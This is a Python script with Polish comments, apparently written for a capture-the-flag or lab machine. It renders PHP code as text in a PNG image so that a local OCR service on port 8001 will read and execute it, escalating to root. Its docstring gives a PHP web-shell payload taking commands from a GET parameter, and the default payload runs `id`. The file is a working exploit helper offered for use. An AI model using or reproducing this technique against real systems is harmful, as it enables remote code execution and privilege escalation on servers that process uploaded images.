#!/usr/bin/env python3
"""
Generuje PNG z dużym tekstem PHP do OCR na 127.0.0.1:8001 (root privesc).
Użycie na maszynie (SSH walter) lub lokalnie, potem upload przez curl.
  python3 ocr_rce.py '<?php system($_GET["c"]); ?>' -o /tmp/ocr-php.png
"""
import argparse
import base64
import sys

try:
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    print("pip install pillow  # lub: apt install python3-pil", file=sys.stderr)
    sys.exit(1)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("text", nargs="?", default='<?php system("id"); ?>')
    p.add_argument("-o", "--output", default="/tmp/ocr-php.png")
    p.add_argument("--width", type=int, default=1200)
    p.add_argument("--height", type=int, default=400)
    args = p.parse_args()

    img = Image.new("RGB", (args.width, args.height), "white")
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 28)
    except OSError:
        font = ImageFont.load_default()

    # Kilka linii jeśli długie — OCR lubi prosty układ
    y = 40
    for line in args.text.replace(";", ";\n").split("\n"):
        line = line.strip()
        if line:
            draw.text((40, y), line, fill="black", font=font)
            y += 36

    img.save(args.output)
    print(args.output)


if __name__ == "__main__":
    main()